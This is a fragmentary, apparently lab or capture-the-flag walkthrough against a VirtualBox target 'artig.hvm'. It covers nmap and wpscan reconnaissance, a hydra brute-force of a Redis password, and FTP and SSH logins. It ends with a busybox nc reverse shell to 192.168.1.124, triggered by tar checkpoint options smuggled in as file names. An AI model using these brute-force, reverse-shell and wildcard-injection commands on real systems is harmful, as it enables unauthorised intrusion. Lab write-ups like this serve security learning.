...
192.168.1.126   08:00:27:ad:30:59       PCS Systemtechnik GmbH
...
Starting Nmap 7.98 ( https://nmap.org ) at 2026-05-03 18:36 -0400
Nmap scan report for artig.hvm (192.168.1.126)
...
|   STAT:
| FTP server status:
|      Connected to ::ffff:192.168.1.124
|      Logged in as ftp
|      TYPE: ASCII
...
MAC Address: 08:00:27:AD:30:59 (Oracle VirtualBox virtual NIC)                                ^Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
...
220 (vsFTPd 3.0.5)
Name (192.168.1.126:ouba): anonymous
...
```bash
└─$ hydra -P /usr/share/wordlists/rockyou.txt redis://192.168.1.126
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-05-03 18:38:23
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking redis://192.168.1.126:6379/
[6379][redis] host: 192.168.1.126   password: w----
[STATUS] attack finished for 192.168.1.126 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-05-03 18:38:45
```

```bash
└─$ redis-cli -h 192.168.1.126 -a w----
Warning: Using a password with '-a' or '-u' option on the command line interface may not be safe.
192.168.1.126:6379> PING
PONG
```
...
```bash
└─$ echo '192.168.1.126 artig.hvm' | sudo tee -a /etc/hosts
[sudo] password for kali:
192.168.1.126 artig.hvm
```

```bash
wpscan --url http://artig.hvm --api-token <api-token> --enumerate vp,vt,tt,cb,dbe,u --plugins-detection aggressive --force --random-user-agent
...
[+] URL: http://artig.hvm/ [192.168.1.126]
[+] Started: Sun May  3 18:49:00 2026
...
[+] Enumerating Vulnerable Plugins (via Aggressive Methods)
 Checking Known Locations - Time: 00:00:11 <============> (7343 / 7343) 100.00% Time: 00:00:11
...
[+] Finished: Sun May  3 18:49:23 2026
[+] Requests Done: 10853
[+] Cached Requests: 13
[+] Data Sent: 2.885 MB
[+] Data Received: 1.779 MB
[+] Memory used: 269.492 MB
...
Connected to 192.168.1.126.
220 (vsFTPd 3.0.5)
Name (192.168.100.176:kali): mario
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
...
```bash
└─$ ssh max@192.168.1.126
max@192.168.1.126's password:
...
3. We can just add a simple reverse shell

```bash
www-data@Artig:~/html$ echo "busybox nc 192.168.1.124 5555 -e /bin/sh" > a
```

```bash
www-data@Artig:~/html$ touch ./"--checkpoint=1"
www-data@Artig:~/html$ touch ./"--checkpoint-action=exec=sh a"
